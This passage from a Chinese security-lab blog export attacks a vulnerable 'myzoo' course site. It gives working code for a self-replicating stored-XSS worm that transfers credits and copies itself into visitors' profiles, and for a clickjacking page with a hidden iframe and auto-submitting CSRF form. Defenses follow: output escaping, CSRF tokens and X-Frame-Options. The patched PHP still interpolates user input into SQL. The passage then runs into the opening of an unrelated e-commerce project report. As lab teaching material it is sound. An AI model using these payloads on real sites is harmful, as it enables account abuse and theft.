<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">&quot;hack&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        xmlhttp=<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span><br><span class="line"><span class="language-javascript">        xmlhttp.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>,<span class="string">&quot;http://www.myzoo.com/transfer.php&quot;</span>,<span class="literal">false</span>);</span></span><br><span class="line"><span class="language-javascript">        xmlhttp.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;Content-type&quot;</span>,<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        xmlhttp.<span class="title function_">send</span>(<span class="string">&quot;zoobars=1&amp;recipient=xssattack1&amp;submission=Send&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        xmlhttp=<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span><br><span class="line"><span class="language-javascript">        xmlhttp.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>,<span class="string">&quot;http://www.myzoo.com/index.php&quot;</span>,<span class="literal">true</span>);</span></span><br><span class="line"><span class="language-javascript">        xmlhttp.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;Content-type&quot;</span>,<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        str = <span class="string">&quot;&lt;span id=hack&gt;&quot;</span></span></span><br><span class="line"><span class="language-javascript">        str += <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;hack&quot;</span>).<span class="property">innerHTML</span> + <span class="string">&quot;&lt;/span&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        str = <span class="built_in">encodeURIComponent</span>(str);</span></span><br><span class="line"><span class="language-javascript">        str = <span class="string">&quot;profile_submit=Save&amp;profile_update=&quot;</span> + str;</span></span><br><span class="line"><span class="language-javascript">        xmlhttp.<span class="title function_">send</span>(str);</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>å½“å…¶ä»–ç”¨æˆ·è®¿é—®xssattack1æ—¶ï¼Œå°±ä¼šç»™xssattack1è½¬1ä¸ªzoobarsï¼Œå¹¶ä¸”å¤åˆ¶xssattack1çš„profileå¤åˆ¶åˆ°è‡ªå·±çš„profileã€‚</p>
<h4 id="é˜²å¾¡-2"><a href="#é˜²å¾¡-2" class="headerlink" title="é˜²å¾¡"></a>é˜²å¾¡</h4><h5 id="æ–¹æ³•1-è¾“å…¥è¿‡æ»¤"><a href="#æ–¹æ³•1-è¾“å…¥è¿‡æ»¤" class="headerlink" title="æ–¹æ³•1:è¾“å…¥è¿‡æ»¤"></a>æ–¹æ³•1:è¾“å…¥è¿‡æ»¤</h5><p>è¾“å…¥è¿‡æ»¤æ¯”è¾ƒå¥½ç†è§£ï¼Œå¯ä»¥é€šè¿‡è®¾ç½®ç™½åå•æˆ–è€…é»‘åå•ï¼Œå°†ä¸€äº›å¯èƒ½é€ æˆæ”»å‡»çš„æ ‡ç­¾éƒ½è¿‡æ»¤ï¼›</p>
<h5 id="æ–¹æ³•2-è¾“å‡ºè½¬ä¹‰"><a href="#æ–¹æ³•2-è¾“å‡ºè½¬ä¹‰" class="headerlink" title="æ–¹æ³•2:è¾“å‡ºè½¬ä¹‰"></a>æ–¹æ³•2:è¾“å‡ºè½¬ä¹‰</h5><p>è¾“å‡ºè½¬ä¹‰ï¼Œä¸»è¦æ˜¯å› ä¸ºè¾“å…¥çš„æ¶æ„ä»£ç ï¼Œå¦‚æœä¿å­˜åœ¨ç½‘ç«™çš„æ•°æ®åº“ä¸­ï¼Œæœ€ç»ˆéƒ½æ˜¯æœ‰ä¸€ä¸ªè¾“å‡ºçš„è¿‡ç¨‹ç„¶åæ‰èƒ½è·å¾—æ‰§è¡Œã€‚é‚£ä¹ˆå°±åœ¨ä»æ•°æ®åº“å–å‡ºï¼Œå¹¶å±•ç¤ºåœ¨ç½‘é¡µä¹‹å‰ï¼Œå¯¹æ‰€æœ‰çš„å†…å®¹è¿›è¡Œè½¬ä¹‰ã€‚PHPä¸­htmlentities() å‡½æ•°æŠŠå­—ç¬¦è½¬æ¢ä¸º HTML å®ä½“ã€‚HTMLå®ä½“ï¼ˆcharacter entitiesï¼‰çš„ç›®çš„æ˜¯æ­£ç¡®åœ°æ˜¾ç¤ºé¢„ç•™å­—ç¬¦ï¼Œè­¬å¦‚å¦‚æœæƒ³è¦åœ¨ç½‘é¡µä¸Šè¾“å‡º&lt;br&gt;ï¼Œå¦‚æœç›´æ¥åœ¨HTMLä¸­å†™&lt;br&gt;ï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨å°†å®ƒå½“åšä»£ç ï¼Œè€Œä¸æ˜¯å­—ç¬¦ä¸²ï¼Œæ­¤æ—¶å°±éœ€è¦ï¼Œå°†&lt;å’Œ&gt;è½¬æ¢ä¸ºå®ä½“ï¼Œä¹Ÿå³&amp;lt; æˆ– &amp;#60ã€‚ä¹Ÿå³ï¼Œé€šè¿‡htmlentitiesï¼Œæ‰€æœ‰çš„æ”»å‡»ä»£ç ï¼Œä¸ç®¡æ€ä¹ˆæ„é€ çš„ï¼Œéƒ½ä¼šè¢«å˜æˆæ™®é€šçš„å­—ç¬¦ï¼Œè€Œä¸ä¼šé€ æˆæ”»å‡»æ•ˆæœã€‚</p>
<p>ä¿®æ”¹users.phpæ–‡ä»¶</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$profile</span> = <span class="title function_ invoke__">strip_tags</span>(<span class="variable">$profile</span>, <span class="variable">$allowed_tags</span>);</span><br><span class="line"><span class="variable">$profile</span> = <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$profile</span>); <span class="comment">//åœ¨users.phpä¸­åŠ å…¥è¿™è¡Œä»£ç å³å¯</span></span><br></pre></td></tr></table></figure>

<h2 id="Click-Jacking"><a href="#Click-Jacking" class="headerlink" title="Click Jacking"></a>Click Jacking</h2><p>åœ¨zoobarç½‘ç«™ä¸Šå±•ç¤ºå¹¶é˜²å¾¡ç‚¹å‡»åŠ«æŒæ”»å‡»ï¼›æˆ–è€…åœ¨å…¶ä»–ç½‘ç«™ä¸Šå®ç°ç‚¹å‡»åŠ«æŒæ”»å‡»ã€‚</p>
<p>ç»“åˆcsrfçš„clickjackingç‰ˆæœ¬</p>
<h3 id="é…ç½®-2"><a href="#é…ç½®-2" class="headerlink" title="é…ç½®"></a>é…ç½®</h3><p>åœ¨myzooç½‘ç«™ä¸Šæ³¨å†Œclickjackingè´¦å·</p>
<p>æ”»å‡»è€…è™šæ‹Ÿæœºé…ç½®(10.211.55.16)</p>
<p>1.åˆ›å»ºclickjacking.html</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo vim /var/www/html/clickjacking.html</span><br></pre></td></tr></table></figure>

<p>å°†ä»¥ä¸‹å†…å®¹å¤åˆ¶è¿›å»</p>
<p>Clickjacking.html</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">iframe</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">1440px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">900px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">position</span>: absolute;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">top</span>: -<span class="number">0px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">left</span>: -<span class="number">0px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">z-index</span>: <span class="number">2</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">opacity</span>: <span class="number">0.5</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-id">#clickjacking</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">position</span>: absolute;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">top</span>: <span class="number">294px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">left</span>: <span class="number">584px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">z-index</span>: <span class="number">1</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">&quot;it&quot;</span> <span class="attr">src</span>=<span class="string">&quot;http://www.myzoo.com/transfer.php&quot;</span> <span class="attr">scrolling</span>=<span class="string">&quot;no&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">name</span>=<span class="string">&quot;transferform&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">action</span>=<span class="string">&quot;http://www.myzoo.com/transfer.php&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">target</span>=<span class="string">&quot;it&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">id</span>=<span class="string">&quot;transferform&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">style</span>=<span class="string">&quot;display:none&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;zoobars&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span> <span class="attr">size</span>=<span class="string">&quot;5&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;recipient&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">value</span>=<span class="string">&quot;clickjacking&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submission&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Send&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">id</span>=<span class="string">&quot;clickjacking&quot;</span> <span class="attr">value</span>=<span class="string">&quot;WIN&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    form = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;transferform&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    form.<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>myzooç½‘ç«™ä¿®æ”¹transfer.php</p>
<p>Transfer.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">  </span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="keyword">require_once</span>(<span class="string">&quot;includes/common.php&quot;</span>); </span><br><span class="line">  <span class="title function_ invoke__">nav_start_outer</span>(<span class="string">&quot;Transfer&quot;</span>);</span><br><span class="line">  <span class="title function_ invoke__">nav_start_inner</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// if($_POST[&#x27;submission&#x27;]) &#123;</span></span><br><span class="line"> <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submission&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;token&#x27;</span>] == <span class="variable">$_SESSION</span>[<span class="string">&#x27;csrf&#x27;</span>]) &#123; </span><br><span class="line"> <span class="comment">//  if($_POST[&#x27;submission&#x27;] &amp;&amp; $_SERVER[&#x27;HTTP_REFERER&#x27;] == &quot;http://www.myzoo.com/transfer.php&quot;) &#123;</span></span><br><span class="line"></span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&#x27;csrf&#x27;</span>] = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">uniqid</span>(<span class="title function_ invoke__">mt_rand</span>(), <span class="literal">true</span>));</span><br><span class="line"></span><br><span class="line">	 <span class="variable">$recipient</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;recipient&#x27;</span>];</span><br><span class="line">    <span class="variable">$zoobars</span> = (<span class="keyword">int</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;zoobars&#x27;</span>];</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT Zoobars FROM Person WHERE PersonID=<span class="subst">$user</span>-&gt;id&quot;</span>;</span><br><span class="line">    <span class="variable">$rs</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">executeQuery</span>(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$rs</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$rs</span>);</span><br><span class="line">    <span class="variable">$sender_balance</span> = <span class="variable">$rs</span>[<span class="string">&quot;Zoobars&quot;</span>] - <span class="variable">$zoobars</span>;</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT PersonID FROM Person WHERE Username=&#x27;<span class="subst">$recipient</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$rs</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">executeQuery</span>(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$rs</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$rs</span>);</span><br><span class="line">    <span class="variable">$recipient_exists</span> = <span class="variable">$rs</span>[<span class="string">&quot;PersonID&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$zoobars</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$sender_balance</span> &gt;= <span class="number">0</span> &amp;&amp; <span class="variable">$recipient_exists</span>) &#123;</span><br><span class="line">      <span class="variable">$sql</span> = <span class="string">&quot;UPDATE Person SET Zoobars = <span class="subst">$sender_balance</span> &quot;</span> .</span><br><span class="line">             <span class="string">&quot;WHERE PersonID=<span class="subst">$user</span>-&gt;id&quot;</span>;</span><br><span class="line">      <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">executeQuery</span>(<span class="variable">$sql</span>);</span><br><span class="line">      <span class="variable">$sql</span> = <span class="string">&quot;SELECT Zoobars FROM Person WHERE Username=&#x27;<span class="subst">$recipient</span>&#x27;&quot;</span>;</span><br><span class="line">      <span class="variable">$rs</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">executeQuery</span>(<span class="variable">$sql</span>);</span><br><span class="line">	<span class="variable">$rs</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$rs</span>);</span><br><span class="line">      <span class="variable">$recipient_balance</span> = <span class="variable">$rs</span>[<span class="string">&quot;Zoobars&quot;</span>] + <span class="variable">$zoobars</span>;</span><br><span class="line">      <span class="variable">$sql</span> = <span class="string">&quot;UPDATE Person SET Zoobars = <span class="subst">$recipient_balance</span> &quot;</span> .</span><br><span class="line">             <span class="string">&quot;WHERE Username=&#x27;<span class="subst">$recipient</span>&#x27;&quot;</span>;</span><br><span class="line">      <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">executeQuery</span>(<span class="variable">$sql</span>);</span><br><span class="line">      <span class="variable">$result</span> = <span class="string">&quot;Sent <span class="subst">$zoobars</span> zoobars&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="variable">$result</span> = <span class="string">&quot;Transfer to <span class="subst">$recipient</span> failed.&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;p&gt;&lt;b&gt;Balance:&lt;/b&gt;</span><br><span class="line">&lt;span id=<span class="string">&quot;myZoobars&quot;</span>&gt;  <span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="variable">$sql</span> = <span class="string">&quot;SELECT Zoobars FROM Person WHERE PersonID=<span class="subst">$user</span>-&gt;id&quot;</span>;</span><br><span class="line">  <span class="variable">$rs</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">executeQuery</span>(<span class="variable">$sql</span>);</span><br><span class="line">  <span class="variable">$rs</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$rs</span>);</span><br><span class="line">  <span class="variable">$balance</span> = <span class="variable">$rs</span>[<span class="string">&quot;Zoobars&quot;</span>];</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$balance</span> &gt; <span class="number">0</span> ? <span class="variable">$balance</span> : <span class="number">0</span>;</span><br><span class="line"><span class="meta">?&gt;</span> &lt;/span&gt; zoobars&lt;/p&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!<span class="variable">$_SESSION</span>[<span class="string">&#x27;csrf&#x27;</span>]) &#123;</span><br><span class="line">     <span class="variable">$_SESSION</span>[<span class="string">&#x27;csrf&#x27;</span>] = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">uniqid</span>(<span class="title function_ invoke__">mt_rand</span>(), <span class="literal">true</span>));</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;form method=POST name=transferform</span><br><span class="line">  action=<span class="string">&quot;&lt;?php echo <span class="subst">$_SERVER</span>[&#x27;PHP_SELF&#x27;]?&gt;&quot;</span>&gt;</span><br><span class="line">&lt;p&gt;Send &lt;input name=zoobars type=text value=<span class="string">&quot;&lt;?php </span></span><br><span class="line"><span class="string">  echo <span class="subst">$_POST</span>[&#x27;zoobars&#x27;]; </span></span><br><span class="line"><span class="string">?&gt;&quot;</span> size=<span class="number">5</span>&gt; zoobars&lt;/p&gt;</span><br><span class="line">&lt;p&gt;to &lt;input name=recipient type=text value=<span class="string">&quot;&lt;?php </span></span><br><span class="line"><span class="string">  echo <span class="subst">$_POST</span>[&#x27;recipient&#x27;]; </span></span><br><span class="line"><span class="string">?&gt;&quot;</span>&gt;&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;input type=hidden name=token value=<span class="string">&quot;&lt;?php echo <span class="subst">$_SESSION</span>[&#x27;csrf&#x27;]?&gt;&quot;</span>/&gt;</span><br><span class="line"></span><br><span class="line">&lt;input type=submit name=submission value=<span class="string">&quot;Send&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;span <span class="class"><span class="keyword">class</span>=<span class="title">warning</span>&gt;&lt;?<span class="title">php</span> </span></span><br><span class="line"><span class="class">  <span class="title">echo</span> &quot;$<span class="title">result</span>&quot;; </span></span><br><span class="line"><span class="class">?&gt;&lt;/<span class="title">span</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span> </span></span><br><span class="line"><span class="class">  <span class="title">nav_end_inner</span>();</span></span><br><span class="line"><span class="class">?&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">script</span> <span class="title">type</span>=&quot;<span class="title">text</span>/<span class="title">javascript</span>&quot; <span class="title">src</span>=&quot;<span class="title">zoobars</span>.<span class="title">js</span>.<span class="title">php</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">  <span class="title">nav_end_outer</span>(); </span></span><br><span class="line"><span class="class">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="æ”»å‡»-3"><a href="#æ”»å‡»-3" class="headerlink" title="æ”»å‡»"></a>æ”»å‡»</h3><p>1.ä¿®æ”¹clickjackingçš„profile</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://www.attack.com/clickjacking.html&quot;</span>&gt;</span>ç‚¹å‡»èµ¢å¤§å¥–<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>2.å½“ç”¨æˆ·victimå»æŸ¥çœ‹clickjackingçš„profileæ—¶ï¼Œå¹¶ç‚¹å‡»é“¾æ¥ï¼Œä¼šå‡ºç°å¦‚ä¸‹ç½‘é¡µï¼ˆåªè¦å°†clickjacking.htmlä¸­opacityè®¾ç½®ä¸º0ï¼ŒåŸé¡µé¢å°±å®Œå…¨çœ‹ä¸åˆ°ï¼‰</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211234359.png" alt="æˆªå±2021-01-08 ä¸‹åˆ8.39.16"></p>
<p>å› ä¸ºç¬¬ä¸€æ¬¡æäº¤çš„è¡¨å•æ²¡æœ‰tokenå­—æ®µï¼Œæ‰€ä»¥csrfæ”»å‡»ä¸æˆåŠŸï¼Œä½†æ˜¯æ­¤æ—¶å·²ç»å°†è¡¨å•å¡«å¥½äº†ï¼Œåªè¦ç”¨æˆ·ç‚¹å‡»winï¼Œå°±ä¼šå‘clickjackingè½¬1ä¸ªzoobarsã€‚</p>
<h3 id="é˜²å¾¡-3"><a href="#é˜²å¾¡-3" class="headerlink" title="é˜²å¾¡"></a>é˜²å¾¡</h3><h4 id="æ–¹æ³•ä¸€-X-FRAME-OPTIONS"><a href="#æ–¹æ³•ä¸€-X-FRAME-OPTIONS" class="headerlink" title="æ–¹æ³•ä¸€:X-FRAME-OPTIONS"></a>æ–¹æ³•ä¸€:X-FRAME-OPTIONS</h4><p>1.é…ç½® Apache åœ¨æ‰€æœ‰é¡µé¢ä¸Šå‘é€ X-Frame-Options å“åº”å¤´</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/apache2/sites-available/000-default.conf</span><br></pre></td></tr></table></figure>

<p>åœ¨é‡Œé¢åŠ å…¥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Header always append X-Frame-Options DENY</span><br></pre></td></tr></table></figure>

<p>é‡å¯apache2</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo a2enmod headers</span><br><span class="line">sudo systemctl restart apache2</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>ä¿¡æ¯å®‰å…¨å®è·µ</category>
      </categories>
      <tags>
        <tag>ä¿¡æ¯å®‰å…¨</tag>
      </tags>
  </entry>
  <entry>
    <title>Leyouç»“é¢˜æŠ¥å‘Š</title>
    <url>/2021/12/21/leyou/%E5%9F%BA%E4%BA%8E%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%9E%B6%E6%9E%84%E7%9A%84%E7%B1%BB%E4%BA%AC%E4%B8%9C%E5%B9%B3%E5%8F%B0%E7%BB%93%E9%A2%98%E6%8A%A5%E5%91%8A%20/</url>
    <content><![CDATA[<h1 id="åŸºäºå¾®æœåŠ¡æ¶æ„çš„ç±»äº¬ä¸œç”µå•†å¹³å°ç»“é¢˜æŠ¥å‘Š"><a href="#åŸºäºå¾®æœåŠ¡æ¶æ„çš„ç±»äº¬ä¸œç”µå•†å¹³å°ç»“é¢˜æŠ¥å‘Š" class="headerlink" title="åŸºäºå¾®æœåŠ¡æ¶æ„çš„ç±»äº¬ä¸œç”µå•†å¹³å°ç»“é¢˜æŠ¥å‘Š"></a>åŸºäºå¾®æœåŠ¡æ¶æ„çš„ç±»äº¬ä¸œç”µå•†å¹³å°ç»“é¢˜æŠ¥å‘Š</h1><h1 id="ä¸€ã€ç»ªè®º"><a href="#ä¸€ã€ç»ªè®º" class="headerlink" title="ä¸€ã€ç»ªè®º"></a>ä¸€ã€ç»ªè®º</h1><p>è¿‘å¹´æ¥ï¼Œä¸–ç•Œç»æµæ­£å‘æ•°å­—åŒ–è½¬å‹ï¼Œå¤§åŠ›å‘å±•æ•°å­—ç»æµæˆä¸ºå…¨çƒå…±è¯†ã€‚å…šçš„åä¹å¤§æŠ¥å‘Šæ˜ç¡®æå‡ºè¦å»ºè®¾â€œæ•°å­—ä¸­å›½â€â€œç½‘ç»œå¼ºå›½â€ï¼Œæˆ‘å›½æ•°å­—ç»æµå‘å±•è¿›å…¥æ–°é˜¶æ®µï¼Œå¸‚åœºè§„æ¨¡ä½å±…å…¨çƒç¬¬äºŒï¼Œæ•°å­—ç»æµä¸å®ä½“ç»æµæ·±åº¦èåˆï¼Œæœ‰åŠ›ä¿ƒè¿›äº†ä¾›ç»™ä¾§ç»“æ„æ€§æ”¹é©ã€‚ç”µå­å•†åŠ¡æ˜¯æ•°å­—ç»æµçš„é‡è¦ç»„æˆéƒ¨åˆ†ï¼Œæ˜¯æ•°å­—ç»æµæœ€æ´»è·ƒã€æœ€é›†ä¸­çš„è¡¨ç°å½¢å¼ä¹‹ä¸€ã€‚</p>
<p>è¿‘å¹´æ¥ï¼Œç”µå­å•†åŠ¡è§„æ¨¡é€æ­¥æ‰©å¤§ï¼Œå·²ç»æ·±å…¥åˆ°æˆ‘ä»¬ç”Ÿæ´»çš„å„ä¸ªè§’è½ï¼Œç‰¹åˆ«æ˜¯ä¸€äº›å…¨æ°‘å‚ä¸çš„è´­ç‰©åº†å…¸ï¼Œå…¶å…¸å‹ä»£è¡¨å°±æ˜¯æ¯å¹´ä¸€åº¦çš„åŒåä¸€ã€6.18ç­‰æ´»åŠ¨ã€‚</p>
<p>2020åŒ11å¼€åœº30åˆ†é’Ÿï¼Œåˆ›é€ <strong>æ¯ç§’äº¤æ˜“å³°å€¼58.3ä¸‡ç¬”</strong>ã€‚</p>
<p>2021å¹´ï¼Œé˜¿é‡Œè‡ªç ”æ•°æ®åº“OceanBaseçš„å³°å€¼è¾¾åˆ°9200ä¸‡æ¬¡ã€‚</p>
<p>å¦‚æ­¤é«˜çš„å¹¶å‘ï¼Œå¯¹æŠ€æœ¯æœ‰å¾ˆé«˜çš„è¦æ±‚ï¼š</p>
<ul>
<li>æŠ€æœ¯èŒƒå›´å¹¿</li>
<li>æŠ€æœ¯æ–°</li>
<li>è¦æ±‚åŒé«˜ï¼š<ul>
<li>é«˜å¹¶å‘ï¼ˆåˆ†å¸ƒå¼ã€é™æ€åŒ–æŠ€æœ¯ã€CDNæœåŠ¡ã€ç¼“å­˜æŠ€æœ¯ã€å¼‚æ­¥å¹¶å‘ã€æ± åŒ–ã€é˜Ÿåˆ—ï¼‰</li>
<li>é«˜å¯ç”¨ï¼ˆé›†ç¾¤ã€è´Ÿè½½å‡è¡¡ã€é™æµã€é™çº§ã€ç†”æ–­ï¼‰</li>
</ul>
</li>
<li>æ•°æ®é‡å¤§</li>
<li>ä¸šåŠ¡å¤æ‚</li>
</ul>
<p>å› æ­¤ï¼Œå³ä½¿åˆšå¼€å§‹å…¬å¸çš„è§„æ¨¡ä¸å¤§ï¼Œå¹¶å‘é‡å¾ˆå°ï¼Œæˆ‘ä»¬çš„å•†åŸé¡¹ç›®ä¹Ÿä¸èƒ½å†åŸºäºä¼ ç»Ÿçš„å•åº“å•è¡¨çš„æ–¹å¼çš„æ­å»ºï¼Œè€Œåº”è¯¥åŸºäºå¾®æœåŠ¡æ¶æ„æ­ç®­ï¼Œè¿™æ ·ä»¥åä¸šåŠ¡é‡ä¸Šæ¶¨åªéœ€åŠ¨æ€å¢åŠ æœåŠ¡å™¨æ•°é‡ï¼Œè€Œä¸éœ€è¦é‡æ„é¡¹ç›®ã€‚</p>
